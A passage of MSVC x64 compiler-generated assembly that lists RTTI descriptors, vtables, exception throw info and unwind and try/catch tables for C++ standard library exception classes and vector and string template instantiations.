	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT _CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVruntime_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0runtime_error@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVruntime_error@std@@@8
data$r	SEGMENT
??_R0?AVruntime_error@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::runtime_error `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVruntime_error@std@@', 00H
data$r	ENDS
;	COMDAT ??_7runtime_error@std@@6B@
CONST	SEGMENT
??_7runtime_error@std@@6B@ DQ FLAT:??_R4runtime_error@std@@6B@ ; std::runtime_error::`vftable'
	DQ	FLAT:??_Eruntime_error@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 010901H
	DD	08209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z
	DD	imagerel $ip2state$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z DD 011811H
	DD	0a218H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z
	DD	imagerel $ip2state$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z DD 011811H
	DD	0a218H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
	DD	imagerel $ip2state$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DD 011811H
	DD	0a218H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z DD 011301H
	DD	06213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z DD 011701H
	DD	04217H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z DD 011301H
	DD	08213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$00@std@@YA_K_K@Z DD 010901H
	DD	02209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 010901H
	DD	06209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z DD 010e01H
	DD	0220eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DB 06H
	DB	00H
	DB	00H
	DB	0bdH, 03H
	DB	02H
	DB	'i', 03H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DB 02H
	DB	00H
	DB	00H
	DB	02H
	DD	imagerel $handlerMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DB 04H
	DB	08H
	DB	010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DB 038H
	DD	imagerel $stateUnwindMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
	DD	imagerel $tryMap$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
	DD	imagerel $ip2state$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DD 021619H
	DD	0110116H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DB 06H
	DB	00H
	DB	00H
	DB	0bdH, 03H
	DB	02H
	DB	'i', 03H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DB 02H
	DB	00H
	DB	00H
	DB	02H
	DD	imagerel $handlerMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DB 04H
	DB	08H
	DB	010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DB 038H
	DD	imagerel $stateUnwindMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
	DD	imagerel $tryMap$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
	DD	imagerel $ip2state$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DD 021619H
	DD	0110116H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DB 06H
	DB	00H
	DB	00H
	DB	0d5H, 03H
	DB	02H
	DB	'Y', 03H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DB 02H
	DB	00H
	DB	00H
	DB	02H
	DD	imagerel $handlerMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DB 04H
	DB	08H
	DB	010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DB 038H
	DD	imagerel $stateUnwindMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
	DD	imagerel $tryMap$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
	DD	imagerel $ip2state$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DD 021619H
	DD	0110116H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z DD 010e01H
	DD	0820eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z DD 011301H
	DD	0c213H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DB 0aH
	DB	00H
	DB	00H
	DB	01dH, 03H
	DB	02H
	DB	'B'
	DB	04H
	DB	'A', 09H
	DB	02H
	DB	'v'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DB 02H
	DB	02H
	DB	02H
	DB	04H
	DD	imagerel $handlerMap$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
